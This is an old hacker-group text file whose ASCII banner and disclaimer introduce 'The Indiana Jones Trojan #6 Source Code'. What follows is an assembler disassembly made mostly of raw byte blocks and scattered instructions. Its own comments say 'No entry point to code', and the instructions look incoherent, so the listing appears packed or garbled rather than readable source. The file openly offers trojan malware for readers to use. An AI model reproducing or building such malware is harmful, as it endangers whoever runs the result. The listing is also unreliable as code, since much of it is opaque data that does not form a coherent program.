PHAiT     
PAk#3     
     \/\/\/\/  \       /       /\        /\/\/\/\/\/\  /\/\/\/\/\/\/\/\/\  
     /      /  /       \      /  \            \/               /\
     \      \  \       /     /    \           /\               \/
     /\/\/\/\  /       \    /\/\/\/\          \/               /\ 
     \         \/\/\/\/\   /        \         /\               \/ 
     /         /       /  \         /         \/               /\
     \         \       \  /         \         /\               \/
     /         /       / /           \   /\/\/\/\/\/           /\

     The Material Contained In This Phile Is For Informational Purposes Only, 
the Author Is In No Way Liable For The Missuse Of This Dangerous Tool! Now, 
ZaP of <>PHAiT<> Is Proud To Present: 

	      -=[ The Indiana Jones Trojan #6 Source Code ]=-
	  
-=[------------------------------------------------------------------------]=-
data_44e        equ     1893h                   ;*
data_45e        equ     1A2Dh                   ;*
data_46e        equ     1CE4h                   ;*
data_52e        equ     26C8h                   ;*
data_53e        equ     2E9Dh                   ;*
data_54e        equ     3316h                   ;*
data_58e        equ     3F2Dh                   ;*
data_63e        equ     47B4h                   ;*
data_70e        equ     5612h                   ;*
data_75e        equ     6968h                   ;*
data_77e        equ     6BABh                   ;*
data_83e        equ     880Dh                   ;*
data_92e        equ     9ED7h                   ;*
data_94e        equ     0A363h                  ;*
data_95e        equ     0A8B2h                  ;*
data_96e        equ     0A954h                  ;*
data_100e       equ     0AC51h                  ;*
data_101e       equ     0B487h                  ;*
data_106e       equ     0BD88h                  ;*
data_107e       equ     0BFACh                  ;*
data_116e       equ     0DDC6h                  ;*
data_119e       equ     0EF6Fh                  ;*
data_124e       equ     0FBC3h                  ;*
data_128e       equ     0BCA6h                  ;*

;------------------------------------------------------------  seg_a   ----

seg_a           segment byte public
		assume cs:seg_a  , ds:seg_a , ss:stack_seg_b

						;* No entry point to code
		fsubr   dword ptr ds:data_116e[bx]      ; st = memory - st
		fyl2x                           ; st = st(1)*log2(st)
		db       6Dh,0C7h,0E6h, 28h, 12h, 62h
		db       96h, 37h,0E6h,0BCh, 2Bh, 6Bh
		db       1Ah,0A9h, 1Eh,0B5h,0DAh,0C2h
		db       81h, 37h,0DAh, 5Fh, 81h, 1Dh
		db      0C3h,0F7h,0A4h, 11h, 7Ch, 7Ah
		db       0Dh,0DEh,0AEh, 92h, 03h,0FAh
		db      0C0h, 8Ah,0D6h,0DFh, 52h,0DDh
		db      0A9h,0DFh,0BAh,0EBh,0A7h,0DDh
		db      0DDh,0FBh,0A7h,0DDh, 53h,0FBh
		db      0B9h,0DDh, 30h,0DEh, 52h,0DFh
		db      0C1h, 10h,0D4h, 20h, 2Eh, 55h
		db      0BBh,0CDh, 74h,0DEh, 6Eh, 67h
		db      0FFh,0F2h, 6Fh, 4Bh, 1Fh,0AAh
		db      0D5h
		dw      0CD15h, 0DDh
		dw      6DDEh, 74DDh
		dw      0B95Dh, 5E1h
		dw      44F5h, 0C1F1h
		dw      8F86h, 0DBE3h
		dw      0B877h, 864Eh
		db       76h,0A4h, 1Fh, 3Dh,0B2h,0CAh
		db      0B5h, 9Dh,0E4h, 45h, 9Dh, 0Ah
		db      0B6h,0BEh, 5Ah,0BCh,0DFh,0BAh
		db       49h, 45h,0DFh, 46h, 81h,0BDh
		db       8Dh,0C5h, 65h, 7Bh, 43h, 88h
		db      0C8h, 48h,0D5h,0ECh, 62h, 75h
		db      0DBh,0C9h, 1Fh, 8Bh, 43h, 7Bh
		db      0F4h,0C1h, 50h, 8Ah,0DDh, 2Dh
		db       9Eh,0ECh,0E1h, 9Bh, 64h, 65h
		db      0CDh, 80h,0D9h,0A7h,0C8h, 93h
		db      0F6h, 0Fh, 83h, 0Dh,0E0h,0BAh
		db       0Dh,0CDh, 86h, 0Dh,0E0h, 44h
		db       15h,0E7h, 86h, 05h,0F5h,0B8h
		db      0F9h,0C9h,0C6h, 35h, 67h, 7Eh
		db       09h,0CBh,0C6h,0A2h,0D7h,0B9h
		db       5Fh, 02h, 91h,0DCh,0C6h, 3Ah
		db       81h,0BAh, 69h, 3Ah,0DFh,0BAh
		db       6Bh, 45h,0DEh, 3Bh, 90h,0BAh
		db      0AFh, 47h,0EDh, 46h, 8Fh, 3Ah
		db       61h,0BAh,0AFh, 47h,0EDh, 72h
		db       60h,0F9h,0DDh,0D8h
		db      0ADh,0A4h,0DDh,0B9h, 93h, 18h
		db      0A4h, 74h, 1Bh,0B8h, 4Dh, 97h
		db      0E3h
		db       0Dh, 54h, 2Eh
		db       3Eh, 7Eh,0C1h,0D3h,0D6h, 3Ah
		db       2Ah,0BBh,0D8h,0B9h
		db      64h
loc_8:
		mov     al,ds:data_52e
		fsub    qword ptr [bp+11h]      ; st = st - memory
		jnp     loc_10                  ; Jump if not parity
		jmp     short $+36h
		db       44h,0DBh, 8Bh, 99h, 44h,0A3h
		db       44h,0C1h,0F0h, 7Dh,0D0h, 43h
		db      0B8h, 41h, 97h,0F2h, 9Dh, 7Fh
		db      0ABh,0F2h, 8Dh,0F2h,0ECh, 49h
		db       9Bh, 0Bh, 7Dh, 9Dh,0D9h,0EBh
		db       28h, 91h,0D9h,0C8h, 22h,0A7h
		db       2Ch,0C5h, 29h,0A1h, 22h,0BDh
		db       2Dh,0BBh,0FFh, 1Dh,0FEh, 82h
		db       04h, 60h, 0Bh, 68h,0DAh, 1Dh
		db      0C6h, 1Dh,0B9h,0F1h,0B9h,0DDh
		db      0B9h,0DDh,0B9h,0DDh,0B9h
loc_10:
		fst     qword ptr ds:data_119e[si]      ; Store st to memory
		retf
						;* No entry point to code
		mov     cx,0C5BFh
		db       62h,0E9h, 85h,0D2h, 9Ch, 4Ah
		db       38h,0ABh,0B6h,0B8h,0BDh, 5Dh
		db       48h, 0Dh, 47h, 22h, 5Fh,0B4h
		db       0Dh,0C8h,0DBh,0B7h,0D0h,0CAh
		db       47h, 6Fh, 2Ch,0A2h,0D3h,0F4h
		db       97h, 41h,0B7h, 3Ah,0DDh,0F1h
		db       89h, 13h,0F8h, 7Bh, 54h, 0Dh
		db       6Fh, 03h
		db      '6Tm,F&if'
		db      0EFh, 09h, 1Dh, 38h, 9Ah, 1Bh
		db       17h, 07h, 47h, 81h, 93h, 01h
		db       08h, 69h, 58h,0F9h, 97h,0F5h
		db       96h,0D0h, 7Fh,0FAh, 4Fh, 7Fh
		db      0FFh, 22h, 20h,0FDh, 59h, 78h
		db      0D7h, 6Dh,0C9h,0A4h,0D3h, 7Eh
		db       1Fh,0BFh,0B1h,0B3h,0C3h, 20h
		db       66h, 18h, 34h, 14h, 3Ch,0DEh
		db      0D6h
		db      0B6h,0DCh, 17h,0F7h,0FDh, 25h
		db      0B1h, 0Bh
		db       4Fh, 4Dh

locloop_12:
		pop     word ptr ds:data_77e[di]
		loop    locloop_12              ; Loop if cx > 0

		dec     bp
		cmp     ds:data_107e,cx
		mov     ax,75DFh
		iret                            ; Interrupt return
						;* No entry point to code
		mov     al,ds:data_70e
		mov     ch,2Ah                  ; '*'
		jbe     $+57h                   ; Jump if below or =
		add     byte ptr ds:data_58e[di],0Ah
		retf
						;* No entry point to code
		cli                             ; Disable interrupts
		mov     al,5Ah                  ; 'Z'
		sal     word ptr ss:data_128e[bx+di],cl ; Shift w/zeros fill
		db      0F1h, 95h, 46h,0E3h, 03h,0E6h
		db       70h, 1Eh
		db      0F3h,0E8h, 8Ch, 25h, 28h,0EEh
		db       3Eh, 5Ch, 9Dh, 09h, 5Bh, 73h
		db       8Bh,0FFh, 54h, 1Bh, 4Eh, 4Ah
		db       6Bh, 95h,0C5h, 4Dh, 3Dh, 3Fh
		db       52h,0C7h,0ACh, 77h, 8Fh, 5Fh
		db       08h, 43h,0BEh, 16h, 99h,0CDh
		db       7Bh, 30h, 13h,0DBh,0B0h, 20h
		db       46h, 04h, 61h, 96h,0F1h, 34h
		db      0FBh,0D8h,0D6h,0AEh, 00h,0A7h
		db       79h, 1Eh, 46h, 22h,0A3h, 4Ah
		db      0AAh,0D5h, 3Ch, 4Bh,0C8h, 74h
		db       87h, 20h, 89h,0D6h,0B1h,0D2h
		db       8Ch, 5Bh, 61h, 41h, 03h, 1Ch
		db      0AEh,0FBh, 52h,0ABh, 5Bh,0CFh
		db       34h,0D8h, 69h,0B2h, 2Fh, 75h
		db       3Dh, 54h, 68h, 18h, 8Ah, 9Dh
		db       42h, 2Ch, 6Ah,0A6h,0E8h, 32h
		db       82h, 8Dh,0DEh,0C4h, 61h, 29h
		db       71h,0E1h,0D0h, 5Eh, 08h,0ADh
		db       3Ah,0C9h, 02h, 51h, 06h,0C7h
		db      0AEh,0B1h,0BCh,0A1h, 6Dh,0FAh
		db       1Ch, 8Eh, 89h, 36h, 41h, 40h
		db      0FEh,0D1h,0C3h,0FFh,0C0h,0A9h
		db       18h, 30h, 32h,0DFh,0E4h, 76h
		db       90h, 3Dh, 07h, 24h,0FDh,0E9h
		db       66h, 66h,0F5h,0DCh,0D8h, 15h
		db       9Dh, 18h, 86h, 47h, 24h,0BFh
		db       0Eh,0E5h,0E7h
		db      3Eh
		db      0BEh, 7Eh, 86h,0FAh, 0Fh,0FCh
		db       56h, 18h, 25h, 20h, 23h, 72h
		db       34h,0D8h, 4Dh, 17h, 42h, 1Ch
		db      0C0h
		db      3Eh
		db       19h, 94h, 5Eh, 08h,0BFh, 04h
		db       0Eh, 5Dh, 38h, 4Fh, 22h,0D8h
		db       7Dh,0BDh, 3Bh, 70h,0F0h,0FBh
		db       78h,0D8h, 56h, 8Eh,0EAh,0D7h
		db      0E8h,0B7h, 37h, 81h,0A4h,0E5h
		db       78h,0AEh, 7Ch, 98h,0CCh, 0Fh
		db      0E2h, 4Dh, 78h, 7Bh, 9Dh,0FDh
		db      0C6h, 2Ch,0E9h
loc_17:
		cmp     al,0A8h
		db       8Fh,0B8h, 80h, 73h, 0Ch,0C3h
		db       72h,0C9h,0F5h, 7Ah, 77h,0D7h
		db      0D3h,0F8h

locloop_18:
		int     32h                     ; ??INT Non-standard interrupt
		or      dl,[bx+si-0Ah]
		cmps    byte ptr cs:[si],es:[di]        ; Cmp [si] to es:[di]
		db       6Ah,0E5h, 0Ah,0E6h, 92h,0E6h
		db      0A2h, 41h,0A0h,0E1h, 6Ah, 2Ah
		db       0Bh, 46h,0C2h, 12h, 46h,0E3h
		db      0BCh,0D0h, 0Bh,0AEh, 1Bh,0D2h
		db      0E8h,0A7h,0ABh, 22h, 78h, 10h
		db       00h,0CBh,0D4h, 5Fh, 78h,0E8h
		db       90h, 01h, 88h, 2Eh, 82h, 38h
		db       28h,0B3h,0D1h, 44h, 24h, 00h
		db       7Ch, 4Dh, 60h,0D5h, 22h, 3Eh
		db       5Ah, 57h, 88h, 83h, 07h, 5Bh
		db      0DAh,0E3h, 25h,0EBh
		db      0FFh,0B5h,0B4h, 47h, 16h,0B7h
		db      0DDh, 94h,0C5h, 78h, 3Eh, 1Eh
		db      0E2h,0ABh, 57h, 43h,0F7h, 18h
		db       11h, 9Ah, 0Fh,0F6h, 70h, 91h
		db       46h, 43h,0DAh, 8Fh, 2Dh, 1Ah
		db       96h,0D8h,0EFh
		db      0C3h                    ; Data table (indexed access)
		db       40h,0A6h, 85h, 99h, 9Dh, 2Eh
		db       30h, 9Ch,0D7h, 9Eh,0E3h
		db       3Ah,0FEh
		db       01h,0D6h,0DFh, 08h, 4Ah, 76h
		db       18h, 37h, 62h, 28h, 37h,0B3h
		db      0EBh, 58h, 37h,0B3h, 85h, 73h
		db       29h,0BCh,0E5h, 14h, 06h, 12h
		db       98h, 49h,0C5h, 7Fh, 40h, 25h
		db       7Bh, 96h, 42h,0AFh, 7Fh,0D5h
		db      0F0h, 93h, 58h,0BDh, 41h, 55h
		db       8Ch,0B3h, 13h, 25h, 0Eh, 2Ch
		db       12h, 9Ch, 19h,0F1h, 8Eh, 69h
		db      0C2h, 34h, 9Eh
loc_22:
		jge     $+3Dh                   ; Jump if > or =
		retn    0C39Ch
		db      0F0h,0BEh,0B8h,0ABh
		db       0Fh, 01h, 67h, 81h,0C2h, 12h
		db      0AFh,0F7h, 32h, 52h, 28h, 3Fh
		db      0D5h, 8Fh, 28h,0C7h,0B6h,0EAh
		db      0BEh,0C7h, 2Ch,0B1h,0ACh, 97h
		db       0Dh,0C0h, 70h,0C0h,0EBh,0A0h
		db       50h, 5Ch, 87h,0F8h,0A4h, 87h
		db       54h,0DBh, 27h, 12h,0A3h, 30h
		db       8Dh,0E5h, 6Bh,0B7h, 7Fh, 0Fh
		db      0B5h, 4Dh,0D6h, 8Ah, 6Eh, 3Ch
		db       92h,0AEh,0C5h,0EAh, 36h,0A0h
		db      0F1h,0E4h,0CBh, 17h, 21h, 54h
		db       43h,0F9h,0D7h, 70h,0B9h, 5Bh
		db       82h, 72h, 5Ah,0FDh, 84h, 41h
		db       72h, 1Ah, 39h,0F7h, 6Dh,0CFh
		db      0BCh, 45h,0B9h, 4Eh,0A5h, 31h
		db      0ECh,0A7h,0DAh, 6Ch, 66h, 22h
		db       96h, 3Fh,0EBh,0C6h,0A6h, 24h
		db       11h, 01h, 1Dh,0F1h,0F5h, 55h
		db      0C2h,0A5h, 6Ch,0D2h, 51h,0E9h
		db       35h, 7Ch, 47h, 5Eh, 7Ch,0E6h
		db      0E6h,0B5h,0A1h, 32h, 0Eh, 7Ch
		db       5Dh,0C9h, 81h,0AAh, 06h, 83h
		db      0B2h, 6Bh, 23h, 4Fh, 5Eh, 20h
		db      0F1h, 52h, 57h,0ECh, 36h, 55h
		db      0F9h, 6Eh, 05h,0A2h,0D5h, 8Bh
		db      0B2h,0EDh, 87h,0AEh,0FAh, 33h
		db      0C7h, 07h, 03h, 66h,0AEh, 98h
		db       94h, 68h,0D6h,0D6h,0F2h, 45h
		db       01h,0B2h,0D2h, 6Ah, 9Eh,0DDh
		db       03h, 19h,0CBh, 01h, 68h, 3Eh
		db       26h, 6Bh,0BFh, 50h,0DBh, 3Bh
		db       46h, 4Eh, 5Ah, 1Dh, 41h,0C5h
		db       96h,0EAh, 1Eh, 4Bh, 41h, 04h
		db      0D2h, 47h, 31h,0BDh, 42h,0A6h
		db       24h, 74h, 89h, 35h,0DEh,0CEh
		db       60h, 30h,0BBh, 74h, 7Eh,0E2h
		db      0EFh, 62h,0F3h,0B5h,0FCh, 0Bh
		db      0F8h,0C1h,0A0h, 5Ah,0C4h,0F7h
		db      0C9h
		db      'MRBgME,W', 9, '$'
		db      0C7h, 22h, 42h,0BFh,0F5h, 4Eh
		db       9Dh,0D2h,0A9h, 5Ah, 5Ah, 1Bh
		db      0F8h, 6Fh, 5Ch, 16h, 5Ah, 2Ch
		db       0Ch,0DFh, 73h,0CDh,0FBh, 85h
		db       15h, 68h, 26h,0CAh,0D4h,0C4h
		db       9Ah, 79h, 4Dh, 73h, 82h
loc_25:
		mov     ds:data_100e,al
		or      al,1Bh
		int     12h                     ; Put (memory size)/1K in ax
		adc     word ptr [bp+si],0Fh
		jnp     loc_25                  ; Jump if not parity
		db      0C8h,0BBh,0A1h, 24h, 0Fh, 7Ah
		db      0A1h, 7Fh, 58h, 66h,0E6h,0DCh
		db       0Eh, 2Dh,0F3h, 5Dh, 49h, 9Ah
		db       5Dh, 97h,0F7h,0A2h, 7Ah, 21h
		db       9Ch, 6Eh, 62h, 92h, 3Bh, 67h
		db       8Eh, 4Fh,0FDh,0AFh, 28h, 43h
		db      0A5h, 68h, 65h, 58h, 59h,0DFh
		db       6Eh,0C0h,0E6h, 8Fh,0F1h, 48h
		db       13h, 9Eh, 9Dh,0E6h, 7Eh, 9Dh
		db      0C2h, 99h, 00h,0FFh, 26h, 4Bh
		db       49h, 87h, 1Bh, 91h, 25h,0FEh
		db       31h, 18h,0B1h, 56h, 5Ch, 34h
		db       0Eh, 61h, 4Fh, 9Ch, 91h, 32h
		db       37h,0E6h, 75h,0BEh,0D5h,0C6h
		db      0CEh, 92h, 73h, 11h, 2Dh, 84h
		db      0F6h,0DAh, 2Eh,0CBh, 0Fh,0D2h
		db       05h, 98h, 1Bh, 39h,0D4h,0FCh
		db       65h, 39h,0D6h,0C2h, 08h, 35h
		db       4Ch, 49h,0C8h,0ABh, 28h,0A6h
		db       1Eh,0A7h, 32h, 25h,0E1h,0B3h
		db      0AFh,0D6h,0BFh, 98h, 79h, 29h
		db       17h,0C2h, 6Ch, 8Dh, 25h, 81h
		db       46h, 1Ch, 1Ah, 6Bh, 7Fh,0C1h
		db       84h, 2Ch, 60h, 13h, 84h, 52h
		db       91h,0DCh, 12h, 19h,0F9h, 66h
		db       70h, 59h, 28h, 07h,0A2h,0BBh
		db       2Dh,0C6h, 92h,0D6h, 37h, 20h
		db      0BBh,0F6h, 9Ch, 4Ch,0CAh, 2Dh
		db       0Ch,0B0h, 7Ch, 70h,0E9h,0DFh
		db      0C0h, 9Fh,0A3h,0F6h,0DDh,0B5h
		db      0A3h, 24h, 6Bh, 63h, 1Fh, 2Bh
		db       2Eh, 72h,0DCh,0F2h, 06h,0D4h
		db       57h, 3Eh, 34h,0F1h, 04h,0C2h
		db       21h, 72h, 13h,0F5h, 0Ah, 0Dh
		db       43h,0C6h, 18h, 66h, 4Bh, 62h
		db       39h,0E6h, 47h, 17h, 2Bh,0D7h
		db      0F0h, 9Bh, 65h, 39h,0A1h, 1Eh
		db       0Fh,0E6h, 68h, 78h,0D9h,0B9h
		db      0E7h, 70h, 9Fh,0E0h, 09h,0EAh
		db       8Ch, 55h, 14h, 8Fh, 95h,0AFh
		db       38h, 9Eh,0E0h, 5Bh,0FFh, 96h
		db      0B4h, 5Fh,0F5h, 14h, 0Ah, 87h
		db       98h, 8Dh,0CBh,0B4h,0E4h, 48h
		db      0FCh,0D6h, 51h, 2Dh, 7Ch, 41h
		db       8Dh, 1Dh, 0Bh, 79h, 35h,0A2h
		db      0A3h,0FEh, 9Fh, 4Dh,0DDh, 22h
		db       04h,0AEh, 85h,0B4h
loc_26:
		db      0F2h, 00h, 31h, 8Bh,0DCh, 9Ah
		db      0DDh,0B8h,0E3h, 3Fh,0F6h, 5Ah
		db       9Eh, 23h,0ECh, 85h,0A0h, 32h
		db       6Ch,0B5h,0E8h,0C8h,0C9h, 65h
		db      0FCh, 0Ah,0EBh, 12h,0FFh,0DCh
		db       0Bh,0E3h,0F1h, 2Ch,0E4h,0F6h
		db      0BCh, 04h,0AFh,0AFh, 33h, 86h
		db      0D6h, 79h,0D0h,0B9h, 88h,0DBh
		db       3Bh,0BEh, 6Bh,0F6h, 25h,0CAh
		db       1Ah, 9Fh,0F5h, 5Dh,0A3h,0B0h
		db      0FAh,0E6h,0C8h
		db       2Bh, 0Bh,0E9h, 7Ch, 25h
loc_28:
		xchg    dx,[bp+si+57C2h]
		push    bp
		db      0F3h, 61h,0CAh,0ECh,0C0h,0F7h
		db      0BAh,0FAh, 15h, 35h, 0Eh, 00h
		db      0A2h, 40h, 20h,0A2h,0E9h, 82h
		db       24h,0C5h, 9Fh,0FBh, 6Eh,0A4h
		db       7Dh, 46h, 8Bh,0FBh, 2Ah,0ACh
		db       9Fh,0DBh, 45h, 2Dh, 3Ah, 80h
		db      0F5h, 2Ch, 3Ah,0F8h,0E1h, 08h
		db       66h,0FAh, 68h, 76h,0C7h,0B6h
		db       0Dh, 56h
		db       73h, 83h, 92h, 7Fh, 11h,0B4h
		db       91h,0CBh, 25h,0CCh, 5Eh, 32h
		db       83h, 77h, 06h, 28h, 7Dh,0AFh
		db       14h,0D4h, 8Dh,0D4h

loc_ret_30:
		retf
						;* No entry point to code
		or      byte ptr ds:[0D320h][si],bh
		pop     bx
		fst     qword ptr ds:[5704h]    ; Store st to memory
		test    ax,8B87h
		jnp     loc_28                  ; Jump if not parity
		xchg    ax,cx
		dec     bx
		db       36h,0DCh,0E1h, 7Eh, 97h,0A2h
		db       5Dh
loc_31:
		mov     si,word ptr ds:[0D2D1h][di]
		stosw                           ; Store ax to es:[di]
		and     al,61h                  ; 'a'
		jo      loc_31                  ; Jump if overflow=1
		xor     al,8Ah
		mov     dx,0C51Bh
		cmp     cl,byte ptr ds:[767Bh][di]
		or      si,dx
		fistp   dword ptr [bx+15h]      ; Pop st to memory
		retn
						;* No entry point to code
		pop     bx
		mov     ah,35h                  ; '5'
		db      0D6h, 85h,0D2h,0A5h,0C6h,0F0h
		db       68h, 1Bh, 5Ch,0B5h, 25h, 85h
		db       50h,0DEh, 6Ah, 2Dh, 34h, 30h
		db      0B2h, 73h,0C0h, 2Eh, 10h,0B6h
		db      0AFh, 52h,0B0h, 06h, 8Eh, 3Dh
		db       10h, 53h,0EBh, 5Dh,0C0h, 8Dh
		db      0A9h, 1Dh,0FFh, 96h, 2Eh, 2Ch
		db      0B5h, 6Ch, 1Eh, 2Fh, 6Ch, 6Ah
		db       9Bh, 3Bh, 1Eh,0E4h,0E6h,0F2h
		db       0Fh, 02h,0CEh,0C6h,0BAh,0C2h
		db       55h, 0Eh, 3Eh, 62h, 09h, 1Ah
		db      0B3h, 6Dh,0BFh, 48h,0F8h,0E8h
		db       72h, 63h, 35h, 4Fh, 9Bh,0D7h
		db       41h, 35h,0F8h,0E3h,0C9h,0B9h
		db       0Eh,0FFh,0F2h, 11h,0E1h,0B0h
		db       4Dh, 7Bh, 6Fh, 9Ah,0CFh,0AEh
		db      0A1h,0C2h, 56h, 80h, 0Fh,0C2h
		db       02h, 68h, 8Dh,0AEh, 40h,0C4h
		db       45h, 0Ah, 16h, 67h,0D0h, 66h
		db       56h, 93h, 92h, 56h, 6Ah, 47h
		db       1Ah,0C0h,0F4h,0DBh, 63h, 0Fh
		db      0FEh,0EBh, 2Dh, 15h,0EBh, 81h
		db       2Fh, 8Ch, 32h, 1Ah, 2Bh,0ACh
		db       9Bh, 4Ah, 4Bh, 69h,0AFh, 0Ah
		db       57h, 98h,0F4h,0ECh, 4Eh, 95h
		db      0A5h, 6Eh,0A1h, 1Eh, 40h, 3Dh
		db       2Dh, 9Ch, 7Eh,0FFh, 39h, 0Eh
		db      0A0h, 24h, 0Dh,0D5h, 82h, 2Dh
		db       32h, 9Bh, 07h, 6Dh,0F2h, 00h
		db       6Ch,0E8h,0ACh,0FBh, 00h, 26h
		db       3Fh,0D0h, 76h, 31h, 84h,0C2h
		db       6Ch, 05h, 99h, 6Eh,0D9h,0A8h
		db      0F7h,0B5h,0AFh, 76h, 14h,0B7h
		db       75h, 53h,0A8h, 13h, 1Fh, 3Bh
		db       24h, 67h, 2Ch, 81h,0A6h, 6Fh
		db       72h, 54h, 35h, 05h, 6Fh,0A0h
		db      0CDh, 9Dh, 84h, 42h,0F5h,0C0h
		db       70h, 47h,0C7h,0D6h, 5Eh,0F3h
		db       5Ah, 1Ah, 67h,0F8h, 4Ah, 68h
		db      0F3h, 6Dh,0D9h, 2Fh,0F4h,0E8h
		db       1Eh,0E8h,0CAh,0B2h, 74h,0FDh
		db      0E1h, 16h, 84h,0A1h,0F4h, 9Dh
		db      0D6h, 43h, 61h,0B7h, 6Ch, 90h
		db       05h,0B1h, 6Ch,0A5h, 74h,0CEh
		db      0FCh,0B0h,0F5h,0B1h, 72h, 80h
		db      0A6h,0A1h, 32h, 05h,0F6h, 89h
		db       5Dh,0F8h, 69h, 0Bh, 99h,0F6h
		db       9Ch, 83h, 0Eh, 62h,0AAh,0F6h
		db       4Ch, 20h, 74h, 99h,0E5h, 1Fh
		db      44h
		db       5Dh, 0Dh, 05h,0C5h,0B1h, 03h
		db       8Fh, 34h, 4Fh, 5Bh, 1Fh, 0Bh
		db       41h,0B9h, 39h, 8Eh, 26h,0A4h
		db       81h,0C4h, 71h,0BFh, 00h, 02h
		db       4Bh,0EAh, 1Bh, 51h, 7Ch, 1Eh
		db       0Fh,0A8h,0A1h
		db       44h, 09h
		db       11h,0E5h,0A3h, 16h, 6Fh, 8Fh
		db       4Bh,0B8h,0C1h, 2Dh, 97h, 9Dh
		db       1Dh,0D2h,0FEh, 39h, 5Ch, 14h
		db       13h,0E3h, 79h,0EAh, 4Dh, 2Bh
		db       59h, 6Fh, 03h, 94h,0CDh,0D3h
		db       00h, 59h,0A9h, 2Dh,0DCh, 4Eh
		db       65h, 47h, 38h,0DEh,0EBh, 3Fh
		db       5Eh, 52h, 92h,0B1h, 25h, 7Dh
		db       93h, 81h,0E7h,0ADh,0C5h, 4Ch
		db       75h,0C3h,0F2h,0B4h,0F6h,0FFh
		db       8Bh, 6Fh,0A8h, 3Ch,0FCh,0D9h
		db      0A0h,0F6h, 4Fh, 24h, 49h,0E4h
		db       2Fh, 94h, 18h,0A6h, 46h, 69h
		db       2Ch, 36h,0FAh, 55h, 66h,0E6h
		db       25h, 8Eh, 04h, 5Dh, 35h,0FCh
		db       47h, 69h, 56h,0D9h, 8Fh, 8Eh
		db      0D1h,0F2h,0BAh,0D6h, 9Bh,0E9h
		db       0Eh,0AFh, 11h, 90h,0AFh, 19h
		db       3Ah,0C9h, 4Eh, 0Dh, 34h, 9Ah
		db       6Fh, 08h,0E4h, 5Bh, 5Eh, 65h
		db      0B4h
		dw      7552h                   ; Data table (indexed access)
		db       9Ch,0E6h,0B3h,0E2h,0DDh,0C1h
		db      0D6h, 03h,0E1h, 3Bh, 0Eh, 14h
		db      0E4h, 36h,0B9h, 03h, 28h,0F8h
		db       64h, 39h,0BAh, 48h,0DEh,0B8h
		db       94h, 91h, 58h,0C9h, 3Bh,0F5h
		db       05h,0F1h, 77h, 7Ah, 57h,0E7h
		db       52h, 11h,0B7h,0DBh, 43h, 78h
		db       35h,0B8h, 19h, 2Bh, 2Bh, 1Ah
		db       05h, 5Eh, 48h, 9Ch,0B5h, 6Fh
		db      0D6h, 06h, 46h,0B6h,0F3h, 9Ah
		db       2Ch, 0Fh, 3Dh,0DDh,0F5h, 20h
		db       69h,0ABh,0DDh,0EDh,0C1h,0CAh
		db      0B0h, 5Dh, 72h, 08h, 9Fh, 36h
		db       85h, 3Eh, 3Ch,0AEh, 6Eh,0CAh
		db       63h, 1Bh,0E4h,0B2h, 27h, 36h
		db       4Ch, 2Dh, 7Bh, 00h,0E3h, 97h
		db      0FDh, 4Bh,0BCh, 01h, 84h, 92h
		db       52h, 5Fh, 62h,0B3h, 92h, 35h
		db      0E4h, 17h,0DBh, 31h, 28h,0C0h
		db      0DFh,0D0h,0A7h, 51h, 03h, 7Dh
		db       12h,0B0h, 7Ah, 5Bh, 5Dh, 4Bh
		db       24h,0A8h, 01h, 4Dh,0E3h, 14h
		db       67h,0E6h, 1Fh,0BEh,0BEh, 21h
		db      0ABh, 2Ah, 4Eh, 57h,0EFh,0D1h
		db       6Bh, 12h, 0Eh,0ABh, 87h, 19h
		db      0C7h, 3Fh,0BDh, 3Bh,0F8h, 83h
		db       59h,0F4h, 5Bh,0E6h,0DEh, 67h
		db       80h,0AFh,0C0h, 94h, 44h, 6Eh
		db      0AFh,0FFh, 08h, 8Eh, 16h, 66h
		db       51h, 53h,0AAh,0D3h, 15h, 60h
		db       95h,0FDh,0FBh, 88h, 93h,0B4h
		db      0F5h, 66h, 46h,0D9h, 24h, 1Ch
		db       57h,0E8h,0CFh, 4Eh,0E4h,0F7h
		db      0C0h,0E8h, 60h, 06h, 61h, 97h
		db       42h, 23h, 4Fh,0A2h, 33h, 8Ch
		db      0D7h, 4Bh, 90h, 03h, 56h, 90h
		db       68h, 5Ch, 80h, 16h,0B0h,0A9h
		db      0F1h, 4Dh, 1Dh, 5Bh, 89h, 80h
		db       3Fh,0B7h, 7Ah, 83h,0B7h, 9Ch
		db      0AEh, 45h, 3Bh,0C9h,0C5h,0DAh
		db       35h, 8Ch, 3Ah, 45h,0CAh, 45h
		db       29h, 26h, 0Ch,0BDh, 67h, 73h
		db      0C1h
loc_34:
		mov     dh,0Dh
		inc     di
		pop     ds
		in      al,0D6h                 ; port 0D6h ??I/O Non-standard
		in      al,77h                  ; port 77h ??I/O Non-standard
		not     word ptr [bp+5Ch]
		mov     cl,30h                  ; '0'
		fdivr   st(3),st                ; st(#) = st / st(#)
		db       26h, 9Dh, 4Ah, 06h, 0Ch,0DEh
		db       19h, 0Fh, 32h, 58h,0D4h, 7Bh
		db       23h,0FEh, 06h,0A8h, 55h, 35h
		db      0A9h,0E9h,0C3h,0D0h, 50h,0A1h
		db       3Eh,0E5h, 0Dh,0C9h,0B8h, 2Ch
		db       3Dh,0AAh,0A7h, 9Fh, 31h, 88h
		db      0A2h,0ADh, 2Eh, 80h, 42h, 2Dh
		db       4Ah, 66h,0B9h, 2Bh,0AFh, 5Bh
		db       79h,0F0h,0A6h, 87h, 87h,0AFh
		db       81h, 97h,0D6h, 3Fh, 0Ah, 93h
		db      0ABh,0C8h, 48h, 4Eh, 31h, 39h
		db       9Bh, 5Bh,0BCh, 26h, 75h,0D2h
		db      0C4h,0A2h, 69h, 13h, 96h, 98h
		db       66h, 70h, 74h, 5Eh,0ABh
		db       11h, 99h, 68h, 69h,0E1h, 11h
		db      0CBh, 12h, 92h, 38h, 24h, 7Eh
		db       74h, 98h, 06h, 94h, 65h, 26h
		db      0BDh,0FCh, 9Dh, 20h, 66h, 26h
		db      0D7h, 62h, 7Ah, 89h, 5Bh, 28h
		db      0D8h, 92h, 7Bh, 6Ch,0E5h, 8Ah
		db       18h, 78h,0A5h, 5Ah, 45h, 9Dh
		db       8Eh, 36h, 49h, 12h,0D5h, 8Ch
		db       34h,0DAh, 30h,0D8h, 3Bh, 9Eh
		db      0CFh,0E1h,0FBh,0F3h, 6Fh, 88h
		db       2Dh, 64h,0A0h,0CCh, 20h, 99h
		db      0CCh,0DCh, 7Ah,0B9h,0E8h,0FCh
		db       26h, 80h, 5Ch, 7Eh, 16h, 4Dh
		db       4Bh,0EBh,0C6h,0DEh, 2Dh, 92h
		db       34h, 92h, 7Bh, 46h, 6Fh, 22h
		db      0F2h,0F9h, 3Ch,0F1h,0BBh, 0Ch
		db       06h,0A2h,0E2h, 41h,0CAh, 88h
